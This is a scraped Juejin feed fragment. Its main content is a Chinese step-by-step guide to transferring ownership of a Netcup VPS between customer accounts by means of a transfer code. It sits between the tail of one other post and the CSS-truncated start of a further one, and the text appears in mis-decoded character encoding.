<p>å¯¹ä¼ä¸šçº§AIè½åœ°æ„Ÿå…´è¶£çš„æœ‹å‹ï¼Œè¯„è®ºåŒºå¯ä»¥èŠèŠä½ ä»¬é‡åˆ°çš„å‘ï¼Œæˆ–è€…é—®SkillæŠ€æœ¯çš„å…·ä½“ç»†èŠ‚ï½</p>
<p>#ä¼ä¸šçº§AI #æŠ€æœ¯è½åœ° #SkillæŠ€æœ¯ #Ooderæ¡†æ¶ #ç¨‹åºå‘˜å¹²è´§ #ç³»ç»Ÿç¿»æ–° #è¡¨å•é‡æ„ #Javaå®æˆ˜ #å¼€å‘æ•ˆç‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Netcup VPS è¿‡æˆ·å…¨æ”»ç•¥ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®‰å…¨åœ°å°†æœåŠ¡å™¨ Push ç»™æ–°ç”¨æˆ·]]></title>    <link>https://juejin.cn/post/7592431064977113103</link>    <guid>https://juejin.cn/post/7592431064977113103</guid>    <pubDate>2026-01-07T15:51:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592431064977113103" data-draft-id="7592432859863203874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Netcup VPS è¿‡æˆ·å…¨æ”»ç•¥ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®‰å…¨åœ°å°†æœåŠ¡å™¨ Push ç»™æ–°ç”¨æˆ·"/> <meta itemprop="keywords" content="æœåŠ¡å™¨"/> <meta itemprop="datePublished" content="2026-01-07T15:51:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Netcup VPS è¿‡æˆ·å…¨æ”»ç•¥ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®‰å…¨åœ°å°†æœåŠ¡å™¨ Push ç»™æ–°ç”¨æˆ·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:51:29.000Z" title="Wed Jan 07 2026 15:51:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Netcup</strong> ä½œä¸ºæ¬§æ´²è‘—åçš„æœåŠ¡å™¨å‚å•†ï¼Œä»¥å…¶æé«˜çš„æ€§ä»·æ¯”è‘—ç§°ã€‚å¾ˆå¤šæœ‹å‹å¯èƒ½æŠ¢è´­åˆ°äº†â€œç¡¬ç›˜ç¿»å€æ¬¾â€æƒ³è¦å‡ºå”®ï¼Œæˆ–è€…å› ä¸ºä¸šåŠ¡è°ƒæ•´éœ€è¦å°†æœåŠ¡å™¨è½¬ç§»åˆ°å¦ä¸€ä¸ªè´¦å·ä¸‹ã€‚</p>
<p>åœ¨ VPS åœˆå­é‡Œï¼Œæˆ‘ä»¬é€šå¸¸ç§°è¿™ç§æ“ä½œä¸º <strong>â€œPushâ€</strong>ã€‚åœ¨ Netcup å®˜æ–¹çš„å®šä¹‰ä¸­ï¼Œè¿™è¢«ç§°ä¸º <strong>â€œäº§å“åˆåŒè½¬ç§»â€</strong> æˆ– <strong>â€œæ‰€æœ‰æƒå˜æ›´ (Owner Change)â€</strong>ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚ä½•å®‰å…¨ã€é¡ºåˆ©åœ°å®Œæˆè¿™ä¸€è¿‡ç¨‹å‘¢ï¼Ÿä»Šå¤©çš„æ•™ç¨‹å°†æ‰‹æŠŠæ‰‹å¸¦ä½ èµ°å®Œå…¨æµç¨‹ã€‚</p>
<h3 data-id="heading-0">å†™åœ¨å‰é¢çš„æ³¨æ„äº‹é¡¹</h3>
<p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œæœ‰å‡ ç‚¹å®˜æ–¹è§„åˆ™éœ€è¦äº†è§£ï¼š</p>
<ol>
<li><strong>æœåŠ¡è¿ç»­æ€§ï¼š</strong> åœ¨è½¬ç§»æœŸé—´ï¼ŒæœåŠ¡å™¨å’Œè™šæ‹Ÿä¸»æœºå°†ç»§ç»­æ­£å¸¸è¿è¡Œï¼Œ<strong>ä¸ä¼šä¸­æ–­æœåŠ¡</strong>ã€‚</li>
<li><strong>è´¹ç”¨é—®é¢˜ï¼š</strong> Netcup çš„å†…éƒ¨è½¬ç§»é€šå¸¸æ˜¯<strong>å…è´¹</strong>çš„ï¼ˆé’ˆå¯¹ VPS äº§å“ï¼‰ã€‚ä½†å¦‚æœæ˜¯è½¬ç§»åŸŸåï¼Œåˆ™ä¼šäº§ç”Ÿæ‰€æœ‰è€…å˜æ›´è´¹ç”¨ã€‚</li>
<li><strong>è´¦å•è´£ä»»ï¼š</strong> è½¬ç§»å®Œæˆåï¼Œè¯¥äº§å“æœªæ¥çš„å‘ç¥¨å°†å¼€å…·ç»™<strong>æ–°æ‰€æœ‰è€…</strong>ã€‚</li>
<li><strong>é™åˆ¶æ¡ä»¶ï¼š</strong> åªæœ‰åœ¨å½“å‰æ‰€æœ‰å‘ç¥¨éƒ½å·²ç»“æ¸…çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½æ‰§è¡Œè½¬ç§»ã€‚</li>
</ol>
<h3 data-id="heading-1">ç¬¬ä¸€é˜¶æ®µï¼šè½¬å‡ºæ–¹ï¼ˆåŸå·ä¸»ï¼‰æ“ä½œæŒ‡å—</h3>
<p>å¦‚æœä½ æ˜¯å–å®¶æˆ–åŸå·ä¸»ï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤ç”Ÿæˆè½¬ç§»ç ã€‚</p>
<h4 data-id="heading-2">1. è¿›å…¥äº§å“ç®¡ç†</h4>
<p>é¦–å…ˆï¼Œç™»å½•ä½ çš„ Netcup CCP (Customer Control Panel) é¢æ¿ã€‚ç‚¹å‡»å·¦ä¾§èœå•çš„ <strong>Products</strong>ï¼Œæ‰¾åˆ°ä½ æƒ³è¦è½¬ç§»çš„é‚£å°æœåŠ¡å™¨ï¼Œç‚¹å‡»å‰æ–¹çš„<strong>æ”¾å¤§é•œå›¾æ ‡</strong>è¿›å…¥è¯¦æƒ…é¡µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9ee57ca6d5a485184473dcbb50dbb26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=nX9d%2F70hHd7WZ79yk6ImtPBEL5M%3D" alt="iShot_2026-01-07_22.31.26.webp" loading="lazy"/></p>
<h4 data-id="heading-3">2. å‘èµ·æ‰€æœ‰æƒå˜æ›´</h4>
<p>åœ¨äº§å“è¯¦æƒ…é¡µä¸­ï¼Œç‚¹å‡»é¡¶éƒ¨çš„ <strong>Cancellation</strong>ï¼ˆå–æ¶ˆï¼‰é€‰é¡¹å¡ã€‚ä¸è¦æ‹…å¿ƒï¼Œè¿™ä¸€æ­¥ä¸æ˜¯è¦æ³¨é”€æœåŠ¡å™¨ï¼Œè€Œæ˜¯è½¬ç§»å…¥å£åœ¨è¿™é‡Œã€‚</p>
<p>åœ¨é¡µé¢ä¸­æ‰¾åˆ°å¹¶ç‚¹å‡» <strong>Add product to owner change</strong>ï¼ˆå˜æ›´æ‰€æœ‰è€…ï¼‰æŒ‰é’®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c14dffa4bde423fa73e14bdb8ddf20d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=%2BLw%2BgqXNx2ddzV45Dax7e50c8aE%3D" alt="image-MLfD.webp" loading="lazy"/></p>
<h4 data-id="heading-4">3. æ£€æŸ¥ä¾èµ–å…³ç³»</h4>
<p>ç³»ç»Ÿä¼šå¼¹å‡ºä¸€ä¸ªæç¤ºæ¡†ï¼Œå‘ŠçŸ¥ä½ è½¬ç§»çš„åæœï¼ˆæ¥æ”¶æ–¹å°†æ¥ç®¡åˆåŒå’Œæ•°æ®ï¼‰ã€‚ç¡®è®¤æ— è¯¯åï¼Œç‚¹å‡»å³ä¸‹è§’çš„ <strong>Check dependencies</strong>ï¼ˆæ£€æŸ¥ä¾èµ–ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd90966ddf404294a117b2e9b7abb71b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=eZAAPatxcqgErRl1S0YQw4up4S4%3D" alt="image-wEnA.webp" loading="lazy"/></p>
<blockquote>
<p><strong>å…³é”®æç¤ºï¼š</strong></p>
<ul>
<li>æ¥æ”¶æ–¹å°†æ¥ç®¡æ•´ä¸ªåˆåŒåŠæ•°æ®ã€‚</li>
<li>å¦‚æœæ˜¯åŸŸåè½¬ç§»ï¼Œæ¥æ”¶æ–¹éœ€è¦æ”¯ä»˜è´¹ç”¨ã€‚</li>
<li>å¦‚æœæ˜¯ä¸ºäº†é˜²æ­¢æ´—é’±ï¼Œè‹¥åœ¨è½¬ç§»å‰å–æ¶ˆåˆåŒï¼Œæ—§æ‰€æœ‰è€…æ”¯ä»˜çš„æœ€åä¸€å¼ å‘ç¥¨ä¸äºˆé€€æ¬¾ã€‚</li>
</ul>
</blockquote>
<h4 data-id="heading-5">4. æ¿€æ´»æ‰€æœ‰æƒå˜æ›´</h4>
<p>ä¾èµ–æ£€æŸ¥é€šè¿‡åï¼Œä¼šå¼¹å‡ºæœ€ç»ˆç¡®è®¤çª—å£ã€‚ç‚¹å‡»åº•éƒ¨çš„ <strong>Activate owner change</strong>ï¼ˆæ¿€æ´»æ‰€æœ‰æƒå˜æ›´ï¼‰ã€‚</p>
<h4 data-id="heading-6">5. è·å–è½¬ç§»ç  (Auth Code)</h4>
<p>æ“ä½œå®Œæˆåï¼Œä½ å°†è·å¾—ä¸€ä¸² <strong>è½¬ç§»ä»£ç </strong>ï¼ˆå¦‚ä¸‹å›¾çº¢æ¡†æ‰€ç¤ºï¼‰ã€‚</p>
<ul>
<li><strong>æœ‰æ•ˆæœŸï¼š</strong> è¯¥ä»£ç æœ‰æ•ˆæœŸä¸º <strong>14å¤©</strong>ã€‚</li>
<li><strong>æ“ä½œï¼š</strong> å°†æ­¤ä»£ç å¤åˆ¶å¹¶å‘é€ç»™â€œæ¥æ”¶æ–¹â€ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7e367911bc4451db1d1ad8eed12427f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=u%2FtmG51ThR4rzqjRYQqi7yIln74%3D" alt="image-AWuh.webp" loading="lazy"/></p>
<blockquote>
<p>**åæ‚”äº†æ€ä¹ˆåŠï¼Ÿ**å¦‚æœä½ ä¸æƒ³å–äº†ï¼Œæˆ–è€…äº¤æ˜“å–æ¶ˆï¼Œä½ å¯ä»¥éšæ—¶å›åˆ°äº§å“çš„ <strong>Cancellation</strong> é€‰é¡¹å¡ï¼Œå°†äº§å“ä¸è½¬ç§»ä»£ç åˆ†ç¦»ï¼ˆæ’¤é”€è½¬ç§»ï¼‰ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7aede050a8447529ff30d7482569d31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=ipquS7Y1ElyIAlHbesGME0dt16I%3D" alt="image-zwez.webp" loading="lazy"/></p>
<h3 data-id="heading-7">ç¬¬äºŒé˜¶æ®µï¼šæ¥æ”¶æ–¹ï¼ˆä¹°å®¶/æ–°å·ä¸»ï¼‰æ“ä½œæŒ‡å—</h3>
<p><strong>å‰ç½®æ¡ä»¶ï¼š</strong> æ¥æ”¶æ–¹å¿…é¡»å·²ç»æ‹¥æœ‰ä¸€ä¸ªæ³¨å†Œå¥½ä¸”æ¿€æ´»çš„ Netcup è´¦å·ã€‚</p>
<h4 data-id="heading-8">1. è¿›å…¥æ‰€æœ‰æƒå˜æ›´å…¥å£</h4>
<p>ç™»å½•ä½ çš„ CCP é¢æ¿ï¼Œåœ¨é¦–é¡µçš„å³ä¸Šè§’æ‰¾åˆ°å¹¶ç‚¹å‡» <strong>Change of ownership</strong>ï¼ˆæ‰€æœ‰æƒå˜æ›´ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45646fa8872b49d3adde13074946ff6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=zCKecbUJ7ZVeQV7VExpq3dJWDP0%3D" alt="image-uCRV.webp" loading="lazy"/></p>
<h4 data-id="heading-9">2. è¾“å…¥è½¬ç§»ç </h4>
<p>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼ˆçº¢æ¡†ä½ç½®ï¼‰ï¼Œè¾“å…¥å–å®¶æä¾›ç»™ä½ çš„ <strong>è½¬ç§»ä»£ç </strong>ï¼Œç„¶åç‚¹å‡»åº•éƒ¨çš„ <strong>Check dependencies</strong>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d31141de29d47baaf6c677af3cf7648~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=pvDv0cxGpClHzHyrKfLZAvhX2mk%3D" alt="image-wxOx.webp" loading="lazy"/></p>
<h4 data-id="heading-10">3. ç¡®è®¤å¹¶æ¥æ”¶äº§å“</h4>
<p>ç³»ç»Ÿä¼šæ˜¾ç¤ºè¯¥è½¬ç§»ç å¯¹åº”çš„äº§å“è¯¦æƒ…ï¼ˆè¯·åŠ¡å¿…æ ¸å¯¹äº§å“é…ç½®å’Œè´¹ç”¨æ˜¯å¦ä¸çº¦å®šä¸€è‡´ï¼‰ã€‚ç¡®è®¤æ— è¯¯åï¼Œç‚¹å‡»åº•éƒ¨çš„ <strong>Activate owner change</strong>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/883f24d1b66b4fa88e4d91819c2abb24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=FeMAYo39A7CsWbfFCBwRHe%2FEH7Y%3D" alt="image-QpNA.webp" loading="lazy"/></p>
<h4 data-id="heading-11">4. è½¬ç§»å®Œæˆ</h4>
<p>ç‚¹å‡»ç¡®è®¤åï¼Œç³»ç»Ÿä¼šå¤„ç†è½¬ç§»è¯·æ±‚ã€‚ä¸€æ—¦å®Œæˆï¼ŒåŒæ–¹ï¼ˆè½¬å‡ºæ–¹å’Œæ¥æ”¶æ–¹ï¼‰éƒ½ä¼šæ”¶åˆ° Netcup å‘æ¥çš„ç¡®è®¤é‚®ä»¶é€šçŸ¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/643790dac22341619402310688ca4ff0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768406027&amp;x-signature=Zbr8PWzJUpvp9ZgMRt8P5%2BHWwqk%3D" alt="image-tWUM.webp" loading="lazy"/></p>
<h3 data-id="heading-12">æ€»ç»“</h3>
<p>é€šè¿‡ä»¥ä¸Šç®€å•çš„å‡ æ­¥ï¼Œä½ å°±å¯ä»¥è½»æ¾å®Œæˆ Netcup VPS çš„ Push æ“ä½œã€‚æ•´ä¸ªè¿‡ç¨‹å®˜æ–¹ä¸æ”¶å–æ‰‹ç»­è´¹ï¼ˆVPSç±»ï¼‰ï¼Œä¸”æ— éœ€å®¢æœä»‹å…¥ï¼Œéå¸¸é«˜æ•ˆã€‚</p>
<p>å¦‚æœä½ åœ¨æ“ä½œè¿‡ç¨‹ä¸­é‡åˆ°ä»»ä½•æŠ¥é”™æˆ–ç–‘é—®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ã€‚</p>
<blockquote>
<p>åŸæ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.legacyvps.com%2Farchives%2Fhow-to-transfer-push-netcup-vps-guide" target="_blank" title="https://www.legacyvps.com/archives/how-to-transfer-push-netcup-vps-guide" ref="nofollow noopener noreferrer">www.legacyvps.com/archives/hoâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäº Squoosh WASM çš„æµè§ˆå™¨ç«¯å›¾ç‰‡è½¬æ¢åº“]]></title>    <link>https://juejin.cn/post/7592483877986451462</link>    <guid>https://juejin.cn/post/7592483877986451462</guid>    <pubDate>2026-01-07T18:21:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877986451462" data-draft-id="7592148975849553963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäº Squoosh WASM çš„æµè§ˆå™¨ç«¯å›¾ç‰‡è½¬æ¢åº“"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-07T18:21:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jump_jump"/> <meta itemprop="url" content="https://juejin.cn/user/4230576474692765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäº Squoosh WASM çš„æµè§ˆå™¨ç«¯å›¾ç‰‡è½¬æ¢åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4230576474692765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jump_jump
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T18:21:01.000Z" title="Wed Jan 07 2026 18:21:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 